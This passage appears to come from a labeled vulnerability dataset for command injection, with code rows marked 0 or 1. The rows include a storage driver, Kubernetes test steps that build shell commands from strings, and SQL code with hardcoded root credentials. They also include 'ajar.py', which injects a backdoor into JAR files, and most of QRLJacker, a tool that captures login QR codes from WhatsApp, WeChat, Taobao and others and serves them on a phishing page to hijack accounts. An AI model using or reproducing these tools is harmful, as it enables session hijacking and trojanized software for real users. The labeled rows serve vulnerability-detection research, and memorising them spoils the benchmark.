            'driver_volume_type': 'iscsi',
            'data': iscsi_properties
        }

    def _create_server(self, connector):
        cliq_args = {}
        cliq_args['serverName'] = connector['host']
        out = self._cliq_run_xml(""getServerInfo"", cliq_args, False)
        response = out.find(""response"")
        result = response.attrib.get(""result"")
        if result != '0':
            cliq_args = {}
            cliq_args['serverName'] = connector['host']
            cliq_args['initiator'] = connector['initiator']
            self._cliq_run_xml(""createServer"", cliq_args)

    def terminate_connection(self, volume, connector, **kwargs):
        """"""Unassign the volume from the host.""""""
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['serverName'] = connector['host']
        self._cliq_run_xml(""unassignVolumeToServer"", cliq_args)

    def get_volume_stats(self, refresh):
        if refresh:
            self._update_backend_status()

        return self.device_stats

    def _update_backend_status(self):
        data = {}
        backend_name = self.configuration.safe_get('volume_backend_name')
        data['volume_backend_name'] = backend_name or self.__class__.__name__
        data['driver_version'] = '1.0'
        data['reserved_percentage'] = 0
        data['storage_protocol'] = 'iSCSI'
        data['vendor_name'] = 'Hewlett-Packard'

        result_xml = self._cliq_run_xml(""getClusterInfo"", {})
        cluster_node = result_xml.find(""response/cluster"")
        total_capacity = cluster_node.attrib.get(""spaceTotal"")
        free_capacity = cluster_node.attrib.get(""unprovisionedSpace"")
        GB = 1073741824

        data['total_capacity_gb'] = int(total_capacity) / GB
        data['free_capacity_gb'] = int(free_capacity) / GB
        self.device_stats = data
/n/n/n",1,command_injection
12,100,5ed8aba271ad20e6168f2e3bd6c25ba89b84484f,"ajar.py/n/nimport zipfile, os, subprocess, shutil, sys, getopt, re

backdoor = target = None
outfile = ""backdoor.jar""

def main(argv):
    global backdoor, target, outfile
    help = 0
    try:
        opts, args = getopt.getopt(argv, ""b:t:o:"", [""backdoor="", ""target="", ""outfile=""])
    except getopt.GetoptError:
        print('USAGE:\tajar.py -b <backdoor.java> -t <target.jar> [-o <outfile.jar>]')
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            help = 1
            print('USAGE:\tajar.py')
        elif opt in (""-b"", ""--backdoor""):
            backdoor = arg
        elif opt in (""-t"", ""--target""):
            target = arg
        elif opt in (""-o"", ""--outfile""):
            outfile = arg
            
    if (backdoor != None) & (target != None):
        try:
            start()
        except:
            print('[!] An error ocurred:\n')
            for e in sys.exc_info():
                print(e)
    elif help != 1:
        print('USAGE:\tajar.py -b <backdoor.java> -t <target.jar> [-o <outfile.jar>]')

def createZip(src, dst):
    zf = zipfile.ZipFile(""%s"" % (dst), ""w"")
    abs_src = os.path.abspath(src)
    for dirname, subdirs, files in os.walk(src):
        for filename in files:
            if filename != backdoor:
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                #print('[*] jaring %s as %s' % (os.path.join(dirname, filename), arcname))
                zf.write(absname, arcname)
    zf.close()
        
def start():
    print(""[*] Starting backdoor process"")
    print(""[*] Decompressing target to tmp directory..."")
    #subprocess.call(""jar -x %s"" % target, shell=True)
    with zipfile.ZipFile(target, 'r') as zip:
        zip.extractall(""tmp"")
    print(""[*] Target dumped to tmp directory"")

    print(""[*] Modifying manifest file..."")
    oldmain=""""
    man = open(""tmp/META-INF/MANIFEST.MF"",""r"").read()
    with open(""tmp/META-INF/MANIFEST.MF"",""w"") as f:
        for l in man.split(""\n""):
            if ""Main-Class"" in l:
                oldmain=l[12:]
                f.write(""Main-Class: %s\n"" % ""Backdoor"")
            else:
                f.write(""%s\n"" % l)
    print(""[*] Manifest file modified"")
    
    print(""[*] Modifying provided backdoor..."")
    inmain=False
    level=0
    bd=open(backdoor, ""r"").read()
    with open(""tmp/%s"" % backdoor,'w') as f:
        for l in bd.split(""\n""):
            if ""main("" in l:
                inmain=True
                f.write(l)
            elif ""}"" in l and level<2 and inmain:
                f.write(""%s.main(args);}"" % oldmain)
                inmain=False
            elif ""}"" in l and level>1 and inmain:
                level-=1
                f.write(l)
            elif ""{"" in l and inmain:
                level+=1
                f.write(l)
            else:
                f.write(l)
    print(""[*] Provided backdoor successfully modified"")

    print(""[*] Compiling modified backdoor..."")
    #if subprocess.call(""javac -cp tmp/ tmp/%s"" % backdoor, shell=True) != 0:
    if subprocess.call(['javac','-cp','tmp/','tmp/%s'%backdoor],shell=False) != 0:
        print(""[!] Error compiling %s"" % backdoor)
    print(""[*] Compiled modified backdoor"")
                
    if(len(oldmain)<1):
        print(""[!] Main-Class manifest attribute not found"")
    else:
        print(""[*] Repackaging target jar file..."")
        createZip(""tmp"",outfile)
        print(""[*] Target jar successfully repackaged"")
    shutil.rmtree('tmp/')
    
if __name__ == ""__main__"":
    main(sys.argv[1:])
/n/n/n",0,command_injection
13,101,5ed8aba271ad20e6168f2e3bd6c25ba89b84484f,"/ajar.py/n/nimport zipfile, os, subprocess, shutil, sys, getopt, re

backdoor = target = None
outfile = ""backdoor.jar""

def main(argv):
    global backdoor, target, outfile
    help = 0
    try:
        opts, args = getopt.getopt(argv, ""b:t:o:"", [""backdoor="", ""target="", ""outfile=""])
    except getopt.GetoptError:
        print('USAGE:\tajar.py -b <backdoor.java> -t <target.jar> [-o <outfile.jar>]')
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            help = 1
            print('USAGE:\tajar.py')
        elif opt in (""-b"", ""--backdoor""):
            backdoor = arg
        elif opt in (""-t"", ""--target""):
            target = arg
        elif opt in (""-o"", ""--outfile""):
            outfile = arg
            
    if (backdoor != None) & (target != None):
        try:
            start()
        except:
            print('[!] An error ocurred:\n')
            for e in sys.exc_info():
                print(e)
    elif help != 1:
        print('USAGE:\tajar.py -b <backdoor.java> -t <target.jar> [-o <outfile.jar>]')

def createZip(src, dst):
    zf = zipfile.ZipFile(""%s"" % (dst), ""w"")
    abs_src = os.path.abspath(src)
    for dirname, subdirs, files in os.walk(src):
        for filename in files:
            if filename != backdoor:
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                #print('[*] jaring %s as %s' % (os.path.join(dirname, filename), arcname))
                zf.write(absname, arcname)
    zf.close()
        
def start():
    print(""[*] Starting backdoor process"")
    print(""[*] Decompressing target to tmp directory..."")
    #subprocess.call(""jar -x %s"" % target, shell=True)
    with zipfile.ZipFile(target, 'r') as zip:
        zip.extractall(""tmp"")
    print(""[*] Target dumped to tmp directory"")

    print(""[*] Modifying manifest file..."")
    oldmain=""""
    man = open(""tmp/META-INF/MANIFEST.MF"",""r"").read()
    with open(""tmp/META-INF/MANIFEST.MF"",""w"") as f:
        for l in man.split(""\n""):
            if ""Main-Class"" in l:
                oldmain=l[12:]
                f.write(""Main-Class: %s\n"" % ""Backdoor"")
            else:
                f.write(""%s\n"" % l)
    print(""[*] Manifest file modified"")
    
    print(""[*] Modifying provided backdoor..."")
    inmain=False
    level=0
    bd=open(backdoor, ""r"").read()
    with open(""tmp/%s"" % backdoor,'w') as f:
        for l in bd.split(""\n""):
            if ""main("" in l:
                inmain=True
                f.write(l)
            elif ""}"" in l and level<2 and inmain:
                f.write(""%s.main(args);}"" % oldmain)
                inmain=False
            elif ""}"" in l and level>1 and inmain:
                level-=1
                f.write(l)
            elif ""{"" in l and inmain:
                level+=1
                f.write(l)
            else:
                f.write(l)
    print(""[*] Provided backdoor successfully modified"")

    print(""[*] Compiling modified backdoor..."")
    if subprocess.call(""javac -cp tmp/ tmp/%s"" % backdoor, shell=True) != 0:
        print(""[!] Error compiling %s"" % backdoor)
    print(""[*] Compiled modified backdoor"")
                
    if(len(oldmain)<1):
        print(""[!] Main-Class manifest attribute not found"")
    else:
        print(""[*] Repackaging target jar file..."")
        createZip(""tmp"",outfile)
        print(""[*] Target jar successfully repackaged"")
    shutil.rmtree('tmp/')
    
if __name__ == ""__main__"":
    main(sys.argv[1:])
/n/n/n",1,command_injection
14,26,5a27336fbe3c220455a015f1bdc2621621f4bf40,"Server/model.py/n/nimport sqlalchemy
from sqlalchemy import text
from sqlalchemy.orm import sessionmaker, scoped_session

engine = sqlalchemy.create_engine('mysql+pymysql://root:bajtastore@127.0.0.1/mydb')
Session = scoped_session(sessionmaker(bind=engine))

def select_all_apps():
	return s.execute(""SELECT * FROM apps"").fetchall()

def select_all_apps_from_user(user_id):
	return s.execute(""SELECT * FROM apps a LEFT JOIN users_apps ua ON ua.app_id = a.id WHERE ua.user_id=?"", user_id)

def select_all_devices_from_user(user_id):
	return s.execute(""SELECT * FROM devices WHERE user_id=?"", user_id)/n/n/nServer/mysql_commands.py/n/nimport sqlalchemy
from sqlalchemy import text
from sqlalchemy.orm import sessionmaker, scoped_session

engine = sqlalchemy.create_engine('mysql+pymysql://root:bajtastore@127.0.0.1/mydb')
Session = scoped_session(sessionmaker(bind=engine))

s = Session()

def select_row_from_mysql_command(command_str):
    ''' function for selecting a specific row  '''
    ''' OUPUT: a list of elements in the selected row '''

    sql = text(str(command_str))
    return s.execute(sql).fetchall()


def insert_into_mysql_command(command_str):
        ''' the function inserts data depending from a command_str '''

        sql = text(str(command_str))
        s.execute(sql)
        s.commit()
/n/n/n",0,command_injection
15,27,5a27336fbe3c220455a015f1bdc2621621f4bf40,"/Server/model.py/n/nfrom mysql_commands import *

def select_all_apps():
	return select_row_from_mysql_command(""SELECT * FROM apps"")

def select_all_apps_from_user(user_id):
	return select_row_from_mysql_command(""SELECT * FROM apps a LEFT JOIN users_apps ua ON ua.app_id = a.id WHERE ua.user_id=?"", user_id)

def select_all_devices_from_user(user_id):
	return select_row_from_mysql_command(""SELECT * FROM devices WHERE user_id=?"", user_id)/n/n/n/Server/mysql_commands.py/n/nimport sqlalchemy
from sqlalchemy import text
from sqlalchemy.orm import sessionmaker, scoped_session

engine = sqlalchemy.create_engine('mysql+pymysql://root:bajtastore@127.0.0.1/mydb')
Session = scoped_session(sessionmaker(bind=engine))

s = Session()

def select_row_from_mysql_command(command_str):
    ''' function for selecting a specific row  '''
    ''' OUPUT: a list of elements in the selected row '''

    sql = text(str(command_str))
    return s.execute(sql).fetchall()


def insert_into_mysql_command(command_str):
        ''' the function inserts data depending from a command_str '''

        sql = text(str(command_str))
        s.execute(sql)
        s.commit()
/n/n/n",1,command_injection
16,44,82d92836d4ff78c623a0e06302c94cfa5ff79908,"tests/post/steps/test_dns.py/n/nimport os

from kubernetes import client, config
import pytest
from pytest_bdd import scenario, then, parsers
import yaml

from tests import utils


@pytest.fixture
def busybox_pod(kubeconfig):
    config.load_kube_config(config_file=kubeconfig)
    k8s_client = client.CoreV1Api()

    # Create the busybox pod
    pod_manifest = os.path.join(
        os.path.realpath(os.path.dirname(__file__)),
        ""files"",
        ""busybox.yaml""
    )
    with open(pod_manifest, encoding='utf-8') as pod_fd:
        pod_manifest_content = yaml.safe_load(pod_fd)

    k8s_client.create_namespaced_pod(
        body=pod_manifest_content, namespace=""default""
    )

    # Wait for the busybox to be ready
    def _check_status():
        pod_info = k8s_client.read_namespaced_pod(
            name=""busybox"",
            namespace=""default"",
        )
        assert pod_info.status.phase == ""Running"", (
            ""Wrong status for 'busybox' Pod - found {status}""
        ).format(status=pod_info.status.phase)

    utils.retry(_check_status, times=10)

    yield ""busybox""

    # Clean-up resources
    k8s_client.delete_namespaced_pod(
        name=""busybox"",
        namespace=""default"",
        body=client.V1DeleteOptions(),
    )


# Scenarios
@scenario('../features/dns_resolution.feature', 'check DNS')
def test_dns(host):
    pass


@then(parsers.parse(""the hostname '{hostname}' should be resolved""))
def resolve_hostname(busybox_pod, host, hostname):
    with host.sudo():
        # test dns resolve
        result = host.run(
            ""kubectl --kubeconfig=/etc/kubernetes/admin.conf ""
            ""exec -ti %s nslookup %s"",
            busybox_pod,
            hostname,
        )

        assert result.rc == 0, ""Cannot resolve {}"".format(hostname)
/n/n/ntests/post/steps/test_liveness.py/n/nimport json
import time

import pytest
from pytest_bdd import scenario, then, parsers

from tests import kube_utils
from tests import utils


# Scenarios
@scenario('../features/pods_alive.feature', 'List Pods')
def test_list_pods(host):
    pass


@scenario('../features/pods_alive.feature', 'Exec in Pods')
def test_exec_in_pods(host):
    pass


@scenario('../features/pods_alive.feature', 'Expected Pods')
def test_expected_pods(host):
    pass


# Then
@then(parsers.parse(
    ""the '{resource}' list should not be ""
    ""empty in the '{namespace}' namespace""))
def check_resource_list(host, resource, namespace):
    with host.sudo():
        output = host.check_output(
            ""kubectl --kubeconfig=/etc/kubernetes/admin.conf ""
            ""get %s --namespace %s -o custom-columns=:metadata.name"",
            resource,
            namespace,
        )

    assert len(output.strip()) > 0, 'No {0} found in namespace {1}'.format(
            resource, namespace)


@then(parsers.parse(
    ""we can exec '{command}' in the pod labeled '{label}' ""
    ""in the '{namespace}' namespace""))
def check_exec(host, command, label, namespace):
    candidates = kube_utils.get_pods(host, label, namespace)

    assert len(candidates) == 1, (
        ""Expected one (and only one) pod with label {l}, found {f}""
    ).format(l=label, f=len(candidates))

    pod = candidates[0]

    with host.sudo():
        host.check_output(
            'kubectl --kubeconfig=/etc/kubernetes/admin.conf '
            'exec --namespace %s %s %s',
            namespace,
            pod['metadata']['name'],
            command,
        )


@then(parsers.parse(
    ""we have at least {min_pods_count:d} running pod labeled '{label}'""))
def count_running_pods(host, min_pods_count, label):
    def _check_pods_count():
        pods = kube_utils.get_pods(
            host,
            label,
            namespace=""kube-system"",
            status_phase=""Running"",
        )

        assert len(pods) >= min_pods_count

    utils.retry(_check_pods_count, times=10, wait=3)
/n/n/ntests/post/steps/test_logs.py/n/nfrom pytest_bdd import scenario, then

# Scenarios
@scenario('../features/log_accessible.feature', 'get logs')
def test_logs(host):
    pass


@then(""the pods logs should not be empty"")
def check_logs(host):
    with host.sudo():
        pods_list = host.check_output(
            'kubectl --kubeconfig=/etc/kubernetes/admin.conf '
            'get pods -n kube-system '
            '--no-headers -o custom-columns="":metadata.name""'
        )
        for pod_id in pods_list.split('\n'):
            pod_logs = host.check_output(
                'kubectl --kubeconfig=/etc/kubernetes/admin.conf '
                'logs %s --limit-bytes=1 -n kube-system',
                pod_id,
            )

            if 'salt-master' not in pod_id:
                assert len(pod_logs.strip()) > 0, (
                    'Error cannot retrieve logs for {}'.format(pod_id))
/n/n/n",0,command_injection
17,45,82d92836d4ff78c623a0e06302c94cfa5ff79908,"/tests/post/steps/test_dns.py/n/nimport os

from kubernetes import client, config
import pytest
from pytest_bdd import scenario, then, parsers
import yaml

from tests import utils


@pytest.fixture
def busybox_pod(kubeconfig):
    config.load_kube_config(config_file=kubeconfig)
    k8s_client = client.CoreV1Api()

    # Create the busybox pod
    pod_manifest = os.path.join(
        os.path.realpath(os.path.dirname(__file__)),
        ""files"",
        ""busybox.yaml""
    )
    with open(pod_manifest, encoding='utf-8') as pod_fd:
        pod_manifest_content = yaml.safe_load(pod_fd)

        k8s_client.create_namespaced_pod(
        body=pod_manifest_content, namespace=""default""
    )

    # Wait for the busybox to be ready
    def _check_status():
        pod_info = k8s_client.read_namespaced_pod(
            name=""busybox"",
            namespace=""default"",
        )
        assert pod_info.status.phase == ""Running"", (
            ""Wrong status for 'busybox' Pod - found {status}""
        ).format(status=pod_info.status.phase)

    utils.retry(_check_status, times=10)

    yield ""busybox""

    # Clean-up resources
    k8s_client.delete_namespaced_pod(
        name=""busybox"",
        namespace=""default"",
        body=client.V1DeleteOptions(),
    )


# Scenarios
@scenario('../features/dns_resolution.feature', 'check DNS')
def test_dns(host):
    pass


@then(parsers.parse(""the hostname '{hostname}' should be resolved""))
def resolve_hostname(busybox_pod, host, hostname):
        with host.sudo():
            # test dns resolve
            cmd_nslookup = (""kubectl --kubeconfig=/etc/kubernetes/admin.conf""
                            "" exec -ti {0} nslookup {1}"".format(
                                pod_name,
                                hostname))
            res = host.run(cmd_nslookup)
            assert res.rc == 0, ""Cannot resolve {}"".format(hostname)
/n/n/n/tests/post/steps/test_liveness.py/n/nimport json
import time

import pytest
from pytest_bdd import scenario, then, parsers

from tests import kube_utils
from tests import utils


# Scenarios
@scenario('../features/pods_alive.feature', 'List Pods')
def test_list_pods(host):
    pass


@scenario('../features/pods_alive.feature', 'Exec in Pods')
def test_exec_in_pods(host):
    pass


@scenario('../features/pods_alive.feature', 'Expected Pods')
def test_expected_pods(host):
    pass


# Then
@then(parsers.parse(
    ""the '{resource}' list should not be ""
    ""empty in the '{namespace}' namespace""))
def check_resource_list(host, resource, namespace):
    with host.sudo():
        cmd = (""kubectl --kubeconfig=/etc/kubernetes/admin.conf""
               "" get {0} --namespace {1} -o custom-columns=:metadata.name"")
        cmd_res = host.check_output(cmd.format(resource, namespace))
    assert len(cmd_res.strip()) > 0, 'No {0} found in namespace {1}'.format(
            resource, namespace)


@then(parsers.parse(
    ""we can exec '{command}' in the pod labeled '{label}' ""
    ""in the '{namespace}' namespace""))
def check_exec(host, command, label, namespace):
    candidates = kube_utils.get_pods(host, label, namespace)

    assert len(candidates) == 1, (
        ""Expected one (and only one) pod with label {l}, found {f}""
    ).format(l=label, f=len(candidates))

    pod = candidates[0]

    cmd = ' '.join([
        'kubectl',
        '--kubeconfig=/etc/kubernetes/admin.conf',
        'exec',
        '--namespace {0}'.format(namespace),
            pod['metadata']['name'],
            command,
    ])

    with host.sudo():
        host.check_output(cmd)


@then(parsers.parse(
    ""we have at least {min_pods_count:d} running pod labeled '{label}'""))
def count_running_pods(host, min_pods_count, label):
    def _check_pods_count():
        pods = kube_utils.get_pods(
            host,
            label,
            namespace=""kube-system"",
            status_phase=""Running"",
        )

        assert len(pods) >= min_pods_count

    utils.retry(_check_pods_count, times=10, wait=3)
/n/n/n/tests/post/steps/test_logs.py/n/nfrom pytest_bdd import scenario, then

# Scenarios
@scenario('../features/log_accessible.feature', 'get logs')
def test_logs(host):
    pass


@then(""the pods logs should not be empty"")
def check_logs(host):
    with host.sudo():
        cmd = ('kubectl --kubeconfig=/etc/kubernetes/admin.conf'
               ' get pods -n kube-system'
               ' --no-headers -o custom-columns="":metadata.name""')
        pods_list = host.check_output(cmd)
        for pod_id in pods_list.split('\n'):
            cmd_logs = ('kubectl --kubeconfig=/etc/kubernetes/admin.conf'
                        ' logs {} --limit-bytes=1 -n kube-system'.format(
                            pod_id))
            res = host.check_output(cmd_logs)
            if 'salt-master' not in pod_id:
                assert len(res.strip()) > 0, (
                    'Error cannot retrieve logs for {}'.format(pod_id))
/n/n/n",1,command_injection
18,108,a101472db88764a0d031ef85fa283967b0692a77,"QrlJacking-Framework/QRLJacker.py/n/n#!/usr/bin/env python
#-*- encoding:utf-8 -*-
#Author:D4Vinci
import base64 ,time ,os ,urllib ,sys ,threading ,configparser
from binascii import a2b_base64

def clear():
	if os.name == ""nt"":
		os.system(""cls"")
	else:
		os.system(""clear"")

try:
	from PIL import Image
	import selenium
	from selenium import webdriver

except:
	print ""[!] Error Importing Exterinal Libraries""
	print ""[!] Trying to install it using pip""
	try:
		os.popen(""python -m pip install selenium"")
		os.popen(""python -m pip install Pillow"")
	except:
		try:
			os.popen(""pip install selenium"")
			os.popen(""pip install Pillow"")
		except:
			print ""[!] Can't install libraries ""
			print ""[!!] Try to install it yourself""
			exit(0)

finally:
	clear()
	from PIL import Image
	import selenium
	from selenium import webdriver

#settings = configparser.ConfigParser()

def Serve_it(port=1337):
	def serve(port):
		if os.name==""nt"":
			print "" [!] Serving files on ""+str(port)+"" port""
			os.popen(""python -m SimpleHTTPServer ""+str(port)+"" > NUL 2>&1"")
		else:
			print "" [!] Serving files on ""+str(port)+"" port""
			os.popen(""python -m SimpleHTTPServer ""+str(port)+"" > /dev/null 2>&1"")
	threading.Thread(target=serve,args=(port,)).start()

def create_driver():
	try:
		web = webdriver.Firefox()
		print "" [+]Opening Mozila FireFox...""
		return web
	except:
		try:
			web = webdriver.Chrome()
			print "" [+]Opening Google Chrome...""
			return web
		except:
			try:
				web = webdriver.Opera()
				print "" [+]Opening Opera...""
				return web
			except:
				try:
					web = webdriver.Edge()
					print "" [+]Opening Edge...""
					return web
				except:
					try:
						web = webdriver.Ie()
						print "" [+]Opening Internet Explorer...""
						return web
					except:
						print "" Error : \n Can not call webbrowsers\n  Check your pc""
						exit(0)

#Stolen from stackoverflow :D
def Screenshot(PicName ,location ,size):
	img = Image.open(PicName)#screenshot.png
	left = location['x']
	top = location['y']
	right = left + size['width']
	bottom = top + size['height']
	box = (int(left), int(top), int(right), int(bottom))
	final = img.crop(box) # defines crop points
	final.load()
	final.save(PicName)

def whatsapp():
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get('https://web.whatsapp.com/')
	time.sleep(5)

	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			button = driver.find_element_by_class_name('qr-button')
			print "" [!]Clicking to reload QR code image...""
			button._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass

		try:
			img = driver.find_elements_by_tag_name('img')[0]
			src = img.get_attribute('src').replace(""data:image/png;base64,"","""")
			print "" [+]The QR code image found !""
			print "" [+]Downloading the image..""
			binary_data = a2b_base64(src)
			qr = open(""tmp.png"",""wb"")
			qr.write(binary_data)
			print "" [#]Saved To tmp.png""
			qr.close()
			time.sleep(5)
			continue
		except:
			break

#make(""svg"")
def Yandex():
	print ""\n-- --- -- --- -- --- -- --- -- --- --""
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get(""https://passport.yandex.com/auth?mode=qr"")
	time.sleep(5)
	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			img_url = ""https://passport.yandex.com"" + driver.find_element_by_class_name(""qr-code__i"").get_attribute(""style"").split(""\"""")[1].encode(""utf-8"")
			print "" [+]The QR code image found !""
			data = urllib.urlopen(img_url).read()
			print "" [+]Downloading the image..""
			f = open(""tmp.svg"",""w"").write(data)
			print "" [#]Saved To tmp.svg""
			time.sleep(10)
			print "" [!]Refreshing page...""
			driver.refresh()
			continue
		except:
			break

def Airdroid():
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get(""http://web.airdroid.com"")
	time.sleep(5)
	img_number = 16
	refresh = 0
	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			button = driver.find_element_by_class_name(""widget-login-refresh-qrcode"")[0]
			print "" [!]Clicking to reload QR code image...""
			button._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[img_number]
			print "" [+]The QR code image found !""
			src = img.get_attribute('src')
			print "" [+]Downloading the image..""
			qr = urllib.urlretrieve(src, ""tmp.png"")
			print "" [#]Saved To tmp.png""
			time.sleep(10)
			if refresh == 0:
				print "" [!]Refreshing page...""
				driver.refresh()
				refresh = 1
			img_number = 15
			continue
		except:
			break

def Weibo():
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get(""http://weibo.com/login.php"")
	time.sleep(5)
	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[len(imgs)-1]
			print "" [+]The QR code image found !""
			src = img.get_attribute('src')
			print "" [+]Downloading the image..""
			qr = urllib.urlretrieve(src, ""tmp.png"")
			print "" [#]Saved To tmp.png""
			time.sleep(10)
			print "" [!]Refreshing page...""
			driver.refresh()
			continue
		except:
			break

def WeChat():
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get(""https://web.wechat.com"")
	time.sleep(5)
	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[0]
			print "" [+]The QR code image found !""
			src = img.get_attribute('src')
			print "" [+]Downloading the image..""
			qr = urllib.urlretrieve(src, ""tmp.png"")
			print "" [#]Saved To tmp.png""
			time.sleep(10)
			continue
		except:
			break

def QQ():
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get(""http://w.qq.com"")
	time.sleep(10)
	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			driver.save_screenshot('tmp.png') #screenshot entire page
			img = driver.find_elements_by_tag_name(""img"")[0]
			print "" [+]The QR code image found !""
			location = img.location
			size = img.size
			print "" [+]Grabbing photo..""
			Screenshot(""tmp.png"" ,location ,size)
			print "" [#]Saved To tmp.png""
			webdriver.delete_all_cookies()
			time.sleep(10)
			print "" [!]Refreshing page...""
			driver.refresh()
			continue
		except:
			break

def Taobao():
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get(""https://login.taobao.com"")
	time.sleep(5)
	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			button_class = web.find_element_by_class_name(""msg-err"")
			button = button_class.find_elements_by_tag_name(""a"")[0]
			print "" [!]Clicking to reload QR code image...""
			button._execute(webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[0]
			print "" [+]The QR code image found !""
			src = img.get_attribute('src')
			print "" [+]Downloading the image..""
			qr = urllib.urlretrieve(src, ""tmp.png"")
			print "" [#]Saved To tmp.png""
			time.sleep(10)
			continue
		except:
			break

def make(typ=""html""):
	if typ == ""html"":
		code = """"""<html>
<head><title>Whatsapp Web</title></head><body><script>
var myTimer;
myTimer = window.setInterval(reloadD,3000);
function reloadD(){
d = new Date();
document.getElementById('qrcodew').src=""tmp.png?h=""+d.getTime();
}
</script><center><h1><b>Scan Me Please</b></h1>
<img id=""qrcodew"" alt=""Scan me!"" src=""tmp.png"" style=""display: block;""></center>
</body></html>""""""

	if typ == ""svg"":
		code = """"""<html>
<head><title>Whatsapp Web</title></head><body><script>
var myTimer;
myTimer = window.setInterval(reloadD,3000);
function reloadD(){
d = new Date();
document.getElementById('qrcodew').src=""tmp.svg?h=""+d.getTime();
}
</script><center><h1><b>Scan Me Please</b></h1>
<object id=""qrcodew"" data=""tmp.svg"" type=""image/svg+xml""></object></center>
</body></html>""""""
	f = open(""index.html"",""w"")
	f.write(code)
	f.close()

def Simple_Exploit(classname,url,image_number,s=10):
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get(url)

	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			login = driver.find_element_by_class_name(classname)
			img = login.find_elements_by_tag_name('img')[int(image_number)]
			print "" [+]The QR code image found !""
			src = img.get_attribute('src')
			print "" [+]Downloading the image..""
			qr = urllib.urlretrieve(src, ""tmp.png"")
			print "" [#]Saved To tmp.png""
			time.sleep(s)
			print "" [!]Refreshing page...""
			driver.refresh()
			continue
		except:
			break

def main():
	#clear()
	print """"""\n
	  ___         _       _               _
	 / _ \  _ __ | |     | |  __ _   ___ | | __ ___  _ __
	| | | || '__|| |  _  | | / _` | / __|| |/ // _ \| '__|
	| |_| || |   | | | |_| || (_| || (__ |   <|  __/| |
	 \__\_\|_|   |_|  \___/  \__,_| \___||_|\_\\___||_|

# Hacking With Qrljacking Attack Vector Become Easy
# Coded By karim Shoair | D4Vinci

 Vulnerable Web Applications and Services:
  1.Chat Applications
  2.Mailing Services
  3.eCommerce
  4.Online Banking
  5.Passport Services
  6.Mobile Management Software
  7.Other Services
  8.Customization
""""""
	choice = input("" Choice > "")

	#Chat Applications
	if choice == 1:
		print """"""
 1.WhatsApp
 2.WeChat
 3.Line
 4.Weibo
 5.QQ Instant Messaging
 00.Back To Main Menu
	""""""

		choice_2 = raw_input("" Second Choice > "")

		if choice_2 == ""00"":
			main()

		#Whatsapp
		elif int(choice_2) == 1:
			port = raw_input("" Port to listen on (Default 1337) : "")
			try:
				int(userInput)
			except ValueError:
				port = 1337

			if port == """":
				port = 1337
			clear()
			make()
			Serve_it(port)
			whatsapp()
			main()

		#Wechat
		elif int(choice_2) == 2:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make()
			Serve_it(port)
			WeChat()
			main()

		#3

		#Weibo
		elif int(choice_2) == 4:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make()
			Serve_it(port)
			Weibo()
			main()

		elif int(choice_2) == 5:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make()
			Serve_it(port)
			QQ()
			main()

	#Mailing Services
	if choice == 2:
		print """"""
 1.QQ Mail
 2.Yandex Mail
 00.Back To Main Menu
	""""""
		choice_2 = raw_input("" Second Choice > "")

		if choice_2 == ""00"":
			main()

		elif int(choice_2) == 2:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make(""svg"")
			Serve_it(port)
			Yandex()
			main()

	#eCommerce
	if choice == 3:
		print """"""
 1.Alibaba
 2.Aliexpress
 3.Taobao
 4.Tmall
 5.1688.com
 6.Alimama
 7.Taobao Trips
 00.Back To Main Menu
	""""""
		choice_2 = raw_input("" Second Choice > "")
		if choice_2 == ""00"":
			main()

		elif int(choice_2) == 3:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make()
			Serve_it(port)
			Taobao()
			main()

		#4

		#5

		#6

		elif int(choice_2) == 7:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make()
			Serve_it(port)
			Taobao()
			main()

	#Online Banking
	if choice == 4:
		print """"""
 1.AliPay
 2.Yandex Money
 3.TenPay
 00.Back To Main Menu
	""""""
		choice_2 = raw_input("" Second Choice > "")
		if choice_2 == ""00"":
			main()

	#Passport Services
	if choice == 5:
		print """"""
 1.Yandex Passport
 00.Back To Main Menu
	""""""
		choice_2 = raw_input("" Second Choice > "")
		if choice_2 == ""00"":
			main()

	#Mobile Management Software
	if choice == 6:
		print """"""
 1.Airdroid
 00.Back To Main Menu
	""""""
